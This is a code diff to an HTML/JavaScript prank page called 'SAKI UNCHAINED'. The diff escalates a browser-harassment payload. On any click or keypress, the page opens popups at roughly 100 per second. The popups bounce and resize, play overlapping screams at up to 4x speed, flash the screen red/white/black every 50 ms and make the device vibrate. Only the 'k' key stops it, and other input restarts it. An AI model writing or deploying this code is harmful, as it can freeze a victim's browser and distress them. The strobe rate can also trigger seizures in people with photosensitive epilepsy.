@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>SAKI</title>
+  <title>SAKI UNCHAINED</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Impact&display=swap');
 
@@ -16,7 +16,7 @@
       height: 100vh;
       margin: 0;
       flex-direction: column;
-      transition: background-color 0.1s ease;
+      transition: background-color 0.05s ease;
     }
 
     button {
@@ -46,35 +46,17 @@
   <button id="start">UNLEASH</button>
 
   <script>
-    let intervalId = null;
     let windows = [];
-    let screamInterval = null;
-    let vibrateInterval = null;
-    let flashInterval = null;
+    let flashInterval, screamInterval, openInterval, vibrateInterval;
     const colors = ['#ff0000', '#ffffff', '#000000'];
+    let flashIndex = 0;
 
-    function playOverlappingScreams() {
+    function playFastScream() {
       const scream = new Audio("scream.mp3");
-      scream.loop = false;
-      scream.playbackRate = Math.random() * 2 + 1; // 1–3x
       scream.volume = 1;
+      scream.playbackRate = Math.random() * 3 + 1; // 1x – 4x
       scream.play();
-    }
-
-    function startVibration() {
-      if ("vibrate" in navigator) {
-        vibrateInterval = setInterval(() => {
-          navigator.vibrate([100, 50, 100]);
-        }, 200);
-      }
-    }
-
-    function startFlashing() {
-      let index = 0;
-      flashInterval = setInterval(() => {
-        document.body.style.backgroundColor = colors[index % colors.length];
-        index++;
-      }, 100);
+      scream.addEventListener("ended", () => scream.remove());
     }
 
     function openSakiWindow() {
@@ -110,7 +92,6 @@
                 display: flex;
                 justify-content: center;
                 align-items: center;
-                z-index: 9999;
               }
               img {
                 width: 150px;
@@ -123,29 +104,29 @@
               <img src="saki.gif" alt="SAKI">
             </div>
             <script>
-              let moveX = 5;
-              let moveY = 4;
-
+              let moveX = 7;
+              let moveY = 6;
               setInterval(() => {
                 let x = window.screenX + moveX;
                 let y = window.screenY + moveY;
                 if (x + window.outerWidth >= screen.availWidth || x <= 0) moveX *= -1;
                 if (y + window.outerHeight >= screen.availHeight || y <= 0) moveY *= -1;
                 window.moveTo(x, y);
-              }, 20);
+              }, 10);
 
               setInterval(() => {
                 const w = Math.floor(Math.random() * 200 + 200);
                 const h = Math.floor(Math.random() * 200 + 200);
                 window.resizeTo(w, h);
-              }, 100);
+              }, 50);
 
               setInterval(() => {
-                const scream = new Audio("scream.mp3");
-                scream.playbackRate = Math.random() * 2 + 1;
-                scream.volume = 1;
-                scream.play();
-              }, 500);
+                const audio = new Audio("scream.mp3");
+                audio.volume = 1;
+                audio.playbackRate = Math.random() * 3 + 1;
+                audio.play();
+                audio.addEventListener("ended", () => audio.remove());
+              }, 400);
             <\/script>
           </body>
           </html>
@@ -154,38 +135,63 @@
       }
     }
 
-    function startSAKI() {
-      if (!intervalId) {
-        screamInterval = setInterval(playOverlappingScreams, 500);
-        startVibration();
-        startFlashing();
-        intervalId = setInterval(openSakiWindow, 2.5);
+    function startFlashing() {
+      flashInterval = setInterval(() => {
+        document.body.style.backgroundColor = colors[flashIndex % colors.length];
+        flashIndex++;
+      }, 50);
+    }
+
+    function startVibration() {
+      if ("vibrate" in navigator) {
+        vibrateInterval = setInterval(() => {
+          navigator.vibrate([200, 100, 200]);
+        }, 200);
       }
     }
 
-    document.getElementById("start").addEventListener("click", startSAKI);
-    document.addEventListener("keydown", (event) => {
-      const key = event.key.toLowerCase();
-      if (key === 'k') {
-        clearInterval(intervalId);
-        clearInterval(screamInterval);
-        clearInterval(vibrateInterval);
-        clearInterval(flashInterval);
-        intervalId = null;
-        if ("vibrate" in navigator) navigator.vibrate(0);
-        windows.forEach(win => {
-          try {
-            if (!win.closed) win.close();
-          } catch (e) {}
-        });
-        alert("SAKI has been silenced.");
-      } else {
-        startSAKI();
-      }
+    function unleashSAKI() {
+      if (openInterval) return;
+
+      startFlashing();
+      startVibration();
+
+      screamInterval = setInterval(() => {
+        for (let i = 0; i < 2; i++) playFastScream();
+      }, 250);
+
+      openInterval = setInterval(() => {
+        openSakiWindow();
+      }, 10); // ~100 popups per second
+    }
+
+    function stopSAKI() {
+      clearInterval(openInterval);
+      clearInterval(screamInterval);
+      clearInterval(flashInterval);
+      clearInterval(vibrateInterval);
+      openInterval = null;
+
+      if ("vibrate" in navigator) navigator.vibrate(0);
+      document.body.style.backgroundColor = "black";
+
+      windows.forEach(win => {
+        try { if (!win.closed) win.close(); } catch {}
+      });
+
+      windows = [];
+      alert("SAKI disabled.");
+    }
+
+    document.getElementById("start").addEventListener("click", unleashSAKI);
+
+    document.addEventListener("keydown", (e) => {
+      const key = e.key.toLowerCase();
+      if (key === 'k') stopSAKI();
+      else unleashSAKI();
     });
 
-    // Tap on mobile also triggers it
-    document.addEventListener("click", startSAKI);
+    document.addEventListener("click", unleashSAKI);
   </script>
 </body>
 </html>
